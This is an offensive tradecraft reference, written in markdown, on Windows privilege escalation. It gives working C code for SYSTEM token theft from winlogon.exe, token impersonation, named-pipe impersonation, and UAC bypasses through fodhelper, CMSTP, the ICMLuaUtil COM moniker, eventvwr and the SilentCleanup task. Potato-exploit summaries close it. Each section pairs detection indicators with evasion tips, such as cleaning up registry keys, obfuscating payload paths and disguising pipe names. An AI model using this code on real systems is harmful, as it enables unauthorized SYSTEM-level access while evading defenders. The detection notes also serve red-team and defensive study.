# Token Manipulation & Privilege Escalation

## Enable Privileges

> OPSEC: 🟢 Low
> Sysmon: Process context only
> ETW: Microsoft-Windows-Security-Auditing (Event 4703 — token privilege adjusted)
> EDR Hooks: NtAdjustPrivilegesToken
> Signature: SeDebugPrivilege enable on non-admin process is suspicious
> Mitigation: Only enable privileges when needed, disable after use

```c
#include <windows.h>
#pragma comment(lib, "advapi32.lib")

BOOL EnablePrivilege(LPCWSTR pszPrivilege) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    if (!LookupPrivilegeValueW(NULL, pszPrivilege, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    bResult = bResult && (GetLastError() == ERROR_SUCCESS);
    CloseHandle(hToken);
    return bResult;
}

// Common privilege names:
// SE_DEBUG_NAME           = L"SeDebugPrivilege"          — access any process
// SE_IMPERSONATE_NAME     = L"SeImpersonatePrivilege"    — impersonate tokens
// SE_ASSIGNPRIMARYTOKEN_NAME = L"SeAssignPrimaryTokenPrivilege" — assign primary token
// SE_BACKUP_NAME          = L"SeBackupPrivilege"         — read any file (bypass ACL)
// SE_RESTORE_NAME         = L"SeRestorePrivilege"        — write any file (bypass ACL)
// SE_TAKE_OWNERSHIP_NAME  = L"SeTakeOwnershipPrivilege"  — take ownership of objects
// SE_LOAD_DRIVER_NAME     = L"SeLoadDriverPrivilege"     — load kernel drivers (BYOVD)
// SE_TCB_NAME             = L"SeTcbPrivilege"            — act as part of OS

// Usage:
EnablePrivilege(SE_DEBUG_NAME);
```

### Enumerate Current Privileges
```c
BOOL ListPrivileges(void) {
    HANDLE hToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
    PTOKEN_PRIVILEGES pPrivs = (PTOKEN_PRIVILEGES)HeapAlloc(GetProcessHeap(), 0, dwSize);
    GetTokenInformation(hToken, TokenPrivileges, pPrivs, dwSize, &dwSize);

    for (DWORD i = 0; i < pPrivs->PrivilegeCount; i++) {
        WCHAR szName[64];
        DWORD cchName = 64;
        LookupPrivilegeNameW(NULL, &pPrivs->Privileges[i].Luid, szName, &cchName);
        BOOL bEnabled = (pPrivs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) != 0;
        wprintf(L"  %s = %s\n", szName, bEnabled ? L"Enabled" : L"Disabled");
    }

    HeapFree(GetProcessHeap(), 0, pPrivs);
    CloseHandle(hToken);
    return TRUE;
}
```

---

## Token Stealing

> OPSEC: 🟡 Medium
> Sysmon: Event ID 10 (Process Access on target), Event ID 1 (new process with stolen token)
> ETW: Microsoft-Windows-Security-Auditing (Event 4624 Type 9 NewCredentials)
> EDR Hooks: NtOpenProcess, NtOpenProcessToken, NtDuplicateToken
> Signature: OpenProcess on SYSTEM processes, DuplicateTokenEx → CreateProcessWithTokenW
> Mitigation: Use handle duplication (NtDuplicateObject) instead of direct OpenProcess

### Direct Token Theft
```c
#include <windows.h>
#include <tlhelp32.h>
#pragma comment(lib, "advapi32.lib")

DWORD FindProcessByName(LPCWSTR pszName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD dwPid = 0;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, pszName) == 0) {
                dwPid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return dwPid;
}

BOOL StealToken(DWORD dwTargetPid, LPCWSTR pszCommandLine) {
    EnablePrivilege(SE_DEBUG_NAME);

    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwTargetPid);
    if (!hProcess) return FALSE;

    // Open its token
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        CloseHandle(hProcess);
        return FALSE;
    }

    // Duplicate as primary token
    HANDLE hDupToken;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                          SecurityImpersonation, TokenPrimary, &hDupToken)) {
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Create process with stolen token
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    WCHAR szCmd[MAX_PATH];
    wcscpy_s(szCmd, MAX_PATH, pszCommandLine);

    BOOL bResult = CreateProcessWithTokenW(hDupToken, LOGON_NETCREDENTIALS_ONLY,
                                           NULL, szCmd, CREATE_NEW_CONSOLE,
                                           NULL, NULL, &si, &pi);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return bResult;
}

// Steal SYSTEM token from winlogon.exe:
// DWORD dwPid = FindProcessByName(L"winlogon.exe");
// StealToken(dwPid, L"cmd.exe");
```

### Alternative: CreateProcessAsUserA
```c
// Requires SeAssignPrimaryTokenPrivilege + SeIncreaseQuotaPrivilege
// Often available to SYSTEM or service accounts
BOOL bResult = CreateProcessAsUserW(hDupToken, NULL, szCmd, NULL, NULL,
                                    FALSE, 0, NULL, NULL, &si, &pi);
```

---

## Token Impersonation

> OPSEC: 🟢 Low (thread-level, no new process)
> Sysmon: Minimal — no process creation
> ETW: Microsoft-Windows-Security-Auditing (Event 4624 logon event)
> Signature: Thread token differs from process token
> Mitigation: Already low-profile for thread impersonation

```c
// Impersonate in current thread (uses impersonation token)
BOOL ImpersonateToken(HANDLE hDupToken) {
    return ImpersonateLoggedOnUser(hDupToken);
    // All operations on current thread now run as the token identity
    // Network operations use the impersonated credentials
}

// Alternative: set token directly on thread
BOOL SetImpersonation(HANDLE hDupToken) {
    return SetThreadToken(NULL, hDupToken);
}

// Revert to original identity
void StopImpersonation(void) {
    RevertToSelf();
}
```

---

## Make Token (LogonUser)

> OPSEC: 🟡 Medium
> Sysmon: None directly
> ETW: Microsoft-Windows-Security-Auditing (Event 4624 Type 9 — NewCredentials)
> Signature: LogonUserA with LOGON32_LOGON_NEW_CREDENTIALS
> Mitigation: Token is only used for network operations, local identity unchanged

```c
#include <windows.h>
#pragma comment(lib, "advapi32.lib")

HANDLE MakeToken(LPCSTR pszUser, LPCSTR pszDomain, LPCSTR pszPassword) {
    HANDLE hToken;
    // LOGON32_LOGON_NEW_CREDENTIALS = type 9 logon
    // Local operations use current identity
    // Network operations use supplied credentials (pass-the-hash compatible)
    if (!LogonUserA(pszUser, pszDomain, pszPassword,
                    LOGON32_LOGON_NEW_CREDENTIALS,
                    LOGON32_PROVIDER_DEFAULT, &hToken))
        return NULL;

    ImpersonateLoggedOnUser(hToken);
    return hToken;
}

// Usage — after this, SMB/RPC operations use the new credentials:
// HANDLE h = MakeToken("admin", "CORP", "Password123!");
// ... perform network operations ...
// RevertToSelf();
// CloseHandle(h);
```

---

## Named Pipe Impersonation

> OPSEC: 🟡 Medium
> Sysmon: Event ID 17 (Pipe Created), Event ID 18 (Pipe Connected)
> ETW: Microsoft-Windows-Security-Auditing (Event 4624)
> EDR Hooks: NtCreateNamedPipeFile
> Signature: Named pipe creation followed by ImpersonateNamedPipeClient
> Mitigation: Use common pipe naming conventions (prefix with legitimate service names)

```c
#include <windows.h>

BOOL ImpersonateViaNamedPipe(LPCSTR pszPipeName) {
    // 1. Create pipe server
    CHAR szPipe[256];
    wsprintfA(szPipe, "\\\\.\\pipe\\%s", pszPipeName);

    HANDLE hPipe = CreateNamedPipeA(szPipe,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1, 1024, 1024, 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE) return FALSE;

    // 2. Wait for client connection
    if (!ConnectNamedPipe(hPipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED) {
        CloseHandle(hPipe);
        return FALSE;
    }

    // 3. Impersonate the connecting client
    if (!ImpersonateNamedPipeClient(hPipe)) {
        DisconnectNamedPipe(hPipe);
        CloseHandle(hPipe);
        return FALSE;
    }

    // Now running as the connecting client's identity
    // Can open their token, duplicate it, etc.
    HANDLE hToken;
    OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken);

    // 4. Cleanup when done
    RevertToSelf();
    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);
    return TRUE;
}
```

---

## UAC Bypass — Fodhelper

> OPSEC: 🟡 Medium
> Sysmon: Event ID 13 (Registry Value Set on ms-settings), Event ID 1 (fodhelper child)
> ETW: Microsoft-Windows-Security-Auditing
> Signature: HKCU\Software\Classes\ms-settings\shell\open\command write, fodhelper.exe spawning non-standard child
> Mitigation: Delete registry key immediately after spawning, use obfuscated payload path

```c
#include <windows.h>
#pragma comment(lib, "advapi32.lib")

#define FODHELPER_KEY "Software\\Classes\\ms-settings\\shell\\open\\command"

BOOL UacBypassFodhelper(LPCSTR pszPayloadPath) {
    HKEY hKey;

    // 1. Create registry key
    if (RegCreateKeyExA(HKEY_CURRENT_USER, FODHELPER_KEY,
                        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                        NULL, &hKey, NULL) != ERROR_SUCCESS)
        return FALSE;

    // 2. Set DelegateExecute to empty (required for bypass)
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);

    // 3. Set default value to payload path
    RegSetValueExA(hKey, "", 0, REG_SZ,
                   (BYTE*)pszPayloadPath, (DWORD)strlen(pszPayloadPath) + 1);
    RegCloseKey(hKey);

    // 4. Launch fodhelper.exe (auto-elevates, reads our key)
    ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\fodhelper.exe",
                  NULL, NULL, SW_HIDE);

    // 5. Cleanup — wait briefly then delete key
    Sleep(2000);
    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");

    return TRUE;
}
```

---

## UAC Bypass — CMSTP

> OPSEC: 🟡 Medium
> Sysmon: Event ID 1 (cmstp.exe launch), Event ID 11 (INF file creation)
> Signature: cmstp.exe /au /s with non-standard INF, temp INF file creation
> Mitigation: Use in-memory INF if possible, cleanup temp file immediately

```c
#include <windows.h>
#include <stdio.h>

BOOL UacBypassCmstp(LPCSTR pszPayloadPath) {
    // 1. Create malicious INF file
    CHAR szTempPath[MAX_PATH], szInfPath[MAX_PATH];
    GetTempPathA(MAX_PATH, szTempPath);
    wsprintfA(szInfPath, "%s\\setup.inf", szTempPath);

    HANDLE hFile = CreateFileA(szInfPath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    CHAR szInf[2048];
    wsprintfA(szInf,
        "[version]\n"
        "Signature=$chicago$\n"
        "AdvancedINF=2.5\n"
        "[DefaultInstall]\n"
        "CustomDestination=CustInstDestSectionAllUsers\n"
        "[CustInstDestSectionAllUsers]\n"
        "49000,49001=AllUSer_LDIDSection,7\n"
        "[AllUSer_LDIDSection]\n"
        "\"HKLM\",\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\","
        "\"ProfileInstallPath\",\"%%UnexpectedError%%\",\"\"\n"
        "[RegisterOCXSection]\n"
        "%%12%%\\scrobj.dll,NI,%s\n"
        "[Strings]\n"
        "ServiceName=\"CorpVPN\"\n"
        "ShortSvcName=\"CorpVPN\"\n",
        pszPayloadPath);

    DWORD dwWritten;
    WriteFile(hFile, szInf, (DWORD)strlen(szInf), &dwWritten, NULL);
    CloseHandle(hFile);

    // 2. Execute cmstp with the INF
    CHAR szCmd[MAX_PATH];
    wsprintfA(szCmd, "cmstp.exe /au /s \"%s\"", szInfPath);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // 3. Cleanup
    DeleteFileA(szInfPath);
    return TRUE;
}
```

---

## UAC Bypass — COM Elevation Moniker (ICMLuaUtil)

> OPSEC: 🟡 Medium
> Sysmon: Event ID 1 (elevated child process)
> ETW: COM activation events
> Signature: CoGetObject with "Elevation:Administrator!" moniker string
> Mitigation: Perform in-memory, no file artifacts

```c
#include <windows.h>
#include <objbase.h>
#pragma comment(lib, "ole32.lib")

// ICMLuaUtil interface definition
typedef interface ICMLuaUtil ICMLuaUtil;
typedef struct ICMLuaUtilVtbl {
    // IUnknown
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(ICMLuaUtil*, REFIID, void**);
    ULONG(STDMETHODCALLTYPE* AddRef)(ICMLuaUtil*);
    ULONG(STDMETHODCALLTYPE* Release)(ICMLuaUtil*);
    // ICMLuaUtil
    HRESULT(STDMETHODCALLTYPE* Method1)(ICMLuaUtil*);
    HRESULT(STDMETHODCALLTYPE* Method2)(ICMLuaUtil*);
    HRESULT(STDMETHODCALLTYPE* Method3)(ICMLuaUtil*);
    HRESULT(STDMETHODCALLTYPE* Method4)(ICMLuaUtil*);
    HRESULT(STDMETHODCALLTYPE* Method5)(ICMLuaUtil*);
    HRESULT(STDMETHODCALLTYPE* Method6)(ICMLuaUtil*);
    HRESULT(STDMETHODCALLTYPE* ShellExec)(ICMLuaUtil*,
        LPCWSTR pszFile, LPCWSTR pszParameters, LPCWSTR pszDirectory,
        ULONG fMask, ULONG nShow);
} ICMLuaUtilVtbl;

struct ICMLuaUtil { ICMLuaUtilVtbl* lpVtbl; };

// CMSTPLUA CLSID: {3E000D72-A845-4CD9-BD83-80C07C3B881F}
static const CLSID CLSID_CMSTPLUA = {
    0x3E000D72, 0xA845, 0x4CD9,
    {0xBD, 0x83, 0x80, 0xC0, 0x7C, 0x3B, 0x88, 0x1F}
};

// ICMLuaUtil IID: {6EDD6D74-C007-4E75-B76A-E5740995E24C}
static const IID IID_ICMLuaUtil = {
    0x6EDD6D74, 0xC007, 0x4E75,
    {0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C}
};

BOOL UacBypassCOMElevation(LPCWSTR pszPayloadPath) {
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    // Build elevation moniker string
    WCHAR szMoniker[256];
    wsprintfW(szMoniker, L"Elevation:Administrator!new:{3E000D72-A845-4CD9-BD83-80C07C3B881F}");

    BIND_OPTS3 bo;
    memset(&bo, 0, sizeof(bo));
    bo.cbStruct = sizeof(bo);
    bo.hwnd = GetForegroundWindow();
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;

    ICMLuaUtil* pCMLuaUtil = NULL;
    HRESULT hr = CoGetObject(szMoniker, (BIND_OPTS*)&bo, &IID_ICMLuaUtil, (LPVOID*)&pCMLuaUtil);
    if (SUCCEEDED(hr)) {
        // ShellExec runs elevated without UAC prompt
        pCMLuaUtil->lpVtbl->ShellExec(pCMLuaUtil, pszPayloadPath,
                                       NULL, NULL, 0, SW_SHOW);
        pCMLuaUtil->lpVtbl->Release(pCMLuaUtil);
    }

    CoUninitialize();
    return SUCCEEDED(hr);
}
```

---

## UAC Bypass — Event Viewer (mmc.exe)

> OPSEC: 🟡 Medium
> Sysmon: Event ID 13 (Registry Value Set on mscfile), Event ID 1 (eventvwr → mmc → payload)
> Signature: HKCU\Software\Classes\mscfile\shell\open\command write
> Mitigation: Delete key immediately after execution

```c
#include <windows.h>
#pragma comment(lib, "advapi32.lib")

#define EVENTVWR_KEY "Software\\Classes\\mscfile\\shell\\open\\command"

BOOL UacBypassEventViewer(LPCSTR pszPayloadPath) {
    HKEY hKey;

    // 1. Set HKCU handler for .msc files
    if (RegCreateKeyExA(HKEY_CURRENT_USER, EVENTVWR_KEY,
                        0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                        NULL, &hKey, NULL) != ERROR_SUCCESS)
        return FALSE;

    RegSetValueExA(hKey, "", 0, REG_SZ,
                   (BYTE*)pszPayloadPath, (DWORD)strlen(pszPayloadPath) + 1);
    RegCloseKey(hKey);

    // 2. Launch eventvwr.exe — it launches mmc.exe which reads our HKCU key
    ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\eventvwr.exe",
                  NULL, NULL, SW_HIDE);

    // 3. Cleanup
    Sleep(3000);
    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\mscfile");

    return TRUE;
}
```

---

## UAC Bypass — Environment Variable Injection (DiskCleanup)

> OPSEC: 🟡 Medium
> Sysmon: Event ID 13 (Environment variable change), Event ID 1 (SilentCleanup task)
> Signature: %windir% environment variable modification, SilentCleanup scheduled task
> Mitigation: Restore %windir% immediately after execution

```c
#include <windows.h>
#pragma comment(lib, "advapi32.lib")

BOOL UacBypassDiskCleanup(LPCSTR pszPayloadDir) {
    // 1. Set %windir% to a directory we control
    // SilentCleanup task runs %windir%\system32\cleanmgr.exe with highest privileges
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "windir", 0, REG_SZ,
                   (BYTE*)pszPayloadDir, (DWORD)strlen(pszPayloadDir) + 1);
    RegCloseKey(hKey);

    // Notify system of environment change
    SendMessageTimeoutA(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
                        (LPARAM)"Environment", SMTO_ABORTIFHUNG, 1000, NULL);

    // 2. Create directory structure: <payloadDir>\system32\cleanmgr.exe
    CHAR szFakeDir[MAX_PATH];
    wsprintfA(szFakeDir, "%s\\system32", pszPayloadDir);
    CreateDirectoryA(pszPayloadDir, NULL);
    CreateDirectoryA(szFakeDir, NULL);
    // Copy payload as cleanmgr.exe into fake system32

    // 3. Trigger the scheduled task (runs as highest available)
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CHAR szCmd[] = "schtasks /Run /TN \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\"";
    CreateProcessA(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // 4. Restore %windir%
    RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hKey);
    RegDeleteValueA(hKey, "windir");
    RegCloseKey(hKey);
    SendMessageTimeoutA(HWND_BROADCAST, WM_SETTINGCHANGE, 0,
                        (LPARAM)"Environment", SMTO_ABORTIFHUNG, 1000, NULL);

    return TRUE;
}
```

---

## Potato Family Overview

### JuicyPotato
- **Prerequisite**: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege (service accounts)
- **Mechanism**: Abuses COM server activation with a chosen CLSID. Creates a local COM server that captures the SYSTEM token during NTLM authentication negotiation via DCOM/BITS.
- **Flow**: CreateObjrefMoniker → activate COM on controlled port → capture token → ImpersonateClient → SYSTEM

### PrintSpoofer
- **Prerequisite**: SeImpersonatePrivilege
- **Mechanism**: Creates a named pipe `\\.\pipe\spoolss` and triggers the spooler service to connect via SpoolssSrv RPC, then impersonates the connecting SYSTEM token.
- **Flow**: CreateNamedPipe(spoolss) → trigger spooler → ImpersonateNamedPipeClient → SYSTEM

### GodPotato
- **Prerequisite**: SeImpersonatePrivilege
- **Mechanism**: Exploits DCOM OXID resolver and NTLM relay to get SYSTEM token. Works across Windows 10/11 and Server 2016-2022 without needing specific CLSIDs.
- **Flow**: Create rogue OXID → NTLM relay → capture SYSTEM token

### RoguePotato
- **Prerequisite**: SeImpersonatePrivilege + remote machine for OXID relay
- **Mechanism**: Redirects OXID resolution to attacker-controlled machine to bypass local OXID resolver restrictions added in newer Windows versions.

### Common Pattern
All Potato variants follow:
1. Hold SeImpersonatePrivilege (common for service accounts: IIS AppPool, SQL Server, etc.)
2. Trick a SYSTEM-level service into authenticating to attacker-controlled endpoint
3. Capture and impersonate the SYSTEM token
4. Create process or perform operations as SYSTEM
